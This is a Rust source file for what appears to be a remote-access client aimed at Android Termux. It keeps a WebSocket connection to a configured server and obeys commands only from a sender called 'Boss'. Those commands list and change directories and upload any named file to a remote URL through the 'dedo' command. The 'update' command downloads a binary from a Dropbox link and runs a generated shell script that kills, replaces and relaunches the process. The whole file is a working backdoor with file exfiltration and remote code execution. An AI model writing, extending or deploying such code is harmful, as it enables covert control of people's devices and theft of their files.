use futures_util:: {
    StreamExt,
    SinkExt,
    stream:: {
        SplitSink,
        SplitStream
    }};
use tokio::io:: {
    AsyncRead,
    AsyncWrite
};

use tokio_tungstenite:: {
    connect_async,
    tungstenite::Message,
    WebSocketStream
};
use serde_json;
use std::sync::Arc;
use tokio::sync::Mutex;
use tokio::time::sleep;
use tokio::time::Duration;
use std::io::Write;
use std::path::PathBuf;
mod utils;

enum Command {
    Cwd,
    Cd(String),
    Ls,
    Version,
    Update,
    Dedo(String),
    Unknown(String),
}

fn parse_command(cmd: &str, args: &[String]) -> Command {
    match cmd {
        "cwd" => Command::Cwd,
        "cd" => {
            if let Some(dir) = args.get(0) {
                Command::Cd(dir.clone())
            } else {
                Command::Unknown("cd missing argument".into())
            }
        }
        "update" => Command::Update,
        "ls" => Command::Ls,
        "sanskaran" => Command::Version,
        "dedo" => {
            if let Some(file) = args.get(0) {
                Command::Dedo(file.clone())
            } else {
                Command::Unknown("dedo missing file".into())
            }
        }
        other => Command::Unknown(other.into()),
    }
}

async fn cmd_cwd() -> String {
    match std::env::current_dir() {
        Ok(path) => path.display().to_string(),
        Err(e) => format!("Error getting cwd: {}", e),
    }
}

async fn cmd_cd(dir: String) -> String {
    let path = PathBuf::from(&dir);

    if !path.exists() {
        return format!("{} exists nahi karta", dir);
    }

    if path.is_file() {
        return format!("{} ek file hai", dir);
    }

    match std::env::set_current_dir(&path) {
        Ok(_) => format!("Changed dir to {}", std::env::current_dir().unwrap().display()),
        Err(e) => format!("Failed to change dir: {}", e),
    }
}

async fn cmd_ls() -> String {
    let mut entries = Vec::new();

    if let Ok(read) = std::fs::read_dir(std::env::current_dir().unwrap()) {
        for ent in read.flatten() {
            if let Ok(name) = ent.file_name().into_string() {
                entries.push(name);
            }
        }
    }

    serde_json::to_string(&entries).unwrap()
}

async fn cmd_dedo(filename: String, uid: u64) -> String {
    let current_dir = std::env::current_dir().unwrap();
    let full_path = current_dir.join(filename);

    if let Some(path_str) = full_path.to_str() {
        if let Ok(url) = utils::getdata("upload_url") {
            return utils::upload_file(path_str, &url, uid, full_path.is_file());
        } else {
            return "upload url not found".to_string();
        }
    } else {
        return "invalid file path".to_string();
    }
}

async fn cmd_update() -> String {
    let url = "https://www.dropbox.com/scl/fi/2dq6et90cvkx2fsoi1k6b/jagooptpy.axe?rlkey=s91wk7ja51j594noplnktfhcs&st=bekvctdm&dl=1";

    if let Ok(resp) = reqwest::blocking::get(url) {
        if let Ok(bytes) = resp.bytes() {
            if let Ok(mut file) = std::fs::File::create("jagooptpy_new.axe") {
                if let Ok(_) = file.write_all(&bytes) {
                    // kill old run new
                    // Save update script
                    let script = [
                        "#!/data/data/com.termux/files/usr/bin/sh",
                        "sleep 1",
                        "pkill -f jagooptpy.axe",
                        "sleep 3",
                        "mv jagooptpy_new.axe jagooptpy.axe",
                        "chmod +x jagooptpy.axe",
                        "./jagooptpy.axe runafterupdate &",
                    ].join("\n");

                    std::fs::write("update.sh", script).unwrap();
                    // Make script executable
                    std::process::Command::new("sh")
                    .arg("-c")
                    .arg("chmod +x update.sh")
                    .spawn()
                    .unwrap();

                    // Run updater script
                    std::process::Command::new("sh")
                    .arg("-c")
                    .arg("bash update.sh &")
                    .spawn()
                    .unwrap();

                    return "Download safal — updater running".to_string();
                }
            }
        }
    }

    "Download asafal".to_string()
}


async fn handle_incoming_messages(
    mut read: SplitStream<WebSocketStream<impl AsyncRead + AsyncWrite + Unpin>>,
    write: Arc<Mutex<SplitSink<WebSocketStream<impl AsyncRead + AsyncWrite + Unpin>, Message>>>,
    uid: u64
) {

    while let Some(message) = read.next().await {
        match message {
            Ok(msg) => match msg {
                Message::Text(text) => {

                    // inside your Message::Text(text) => { ... } branch:
                    let json_str: String = serde_json::from_str(&text).unwrap_or(text.clone());
                    let v: serde_json::Value = match serde_json::from_str(&json_str) {
                        Ok(j) => j,
                        Err(e) => {
                            eprintln!("bad json from server: {}", e);
                            continue;
                        }
                    };
                    let cmd = v.get("msg").and_then(|m| m.as_str()).unwrap_or_default();
                    let args: Vec<String> = v.get("args")
                    .and_then(|a| a.as_array())
                    .map(|arr|
                        arr.iter()
                        .filter_map(|it| it.as_str().map(|s| s.to_string()))
                        .collect()
                    ).unwrap_or_default();
                    let sndrid = v.get("user").and_then(|m| m.as_str()).unwrap_or("nn");
                    if sndrid != "Boss" {
                        continue;
                    }
                    let command = parse_command(cmd, &args);
                    let reply_text = match command {
                        Command::Cwd => cmd_cwd().await,
                        Command::Cd(dir) => cmd_cd(dir).await,
                        Command::Ls => cmd_ls().await,
                        Command::Dedo(file) => cmd_dedo(file, uid).await,
                        Command::Update => cmd_update().await,
                        Command::Version => env!("CARGO_PKG_VERSION").to_string(),
                        Command::Unknown(x) => format!("unknown cmd: {}", x),
                    };
                    bhejo_sandesh(&write, uid, &reply_text).await;

                }
                Message::Binary(bin) => {
                    match String::from_utf8(bin) {
                        Ok(text) => {
                            println!("Received binary (as text): {}", text);
                        }
                        Err(_) => {
                            println!("Received non-UTF8 binary data");
                        }
                    }
                }
                Message::Ping(_payload) => {}
                Message::Pong(_payload) => {}
                Message::Close(_frame) => {
                    break;
                }
                _ => {}
            },
            Err(e) => {
                eprintln!("Error receiving message: {}", e);
                break;
            }
        }
    }

}



async fn bhejo_sandesh(write: &Arc<Mutex<SplitSink<WebSocketStream<impl AsyncRead + AsyncWrite + Unpin>, Message>>>, uid: u64, sanedsh: &str) {
    let response = serde_json::json!({
        "user": &uid,
        "msg": sanedsh
    });
    let json_string = serde_json::to_string(&response).unwrap_or_else(|e| format!(r#"{{"user":"Client","msg":"json error: {}"}}"#, e));
    let mut writer = write.lock().await;
    if let Err(e) = writer.send(Message::Text(json_string)).await {
        eprintln!("failed to send reply: {}", e);
    }
}


async fn start_ws_loop() {
    let uid = utils::getuid();
    println!("{uid}");
    loop {
        if let Ok(wbskturl) = utils::getdata("websoket_url") {
            match connect_async(wbskturl).await {
                Ok((ws_stream, _)) => {
                    let (write, read) = ws_stream.split();
                    let write = Arc::new(Mutex::new(write));
                    let write_clone = write.clone();
                    let read_handle = tokio::spawn(handle_incoming_messages(read, write_clone, uid));
                    bhejo_sandesh(&write, uid, "Connected").await;
                    let _ = read_handle.await;
                }
                Err(_e) => {}
            }
        }
        sleep(Duration::from_secs(220)).await;
    }
}

#[tokio::main]
async fn main() {
    start_ws_loop().await;
}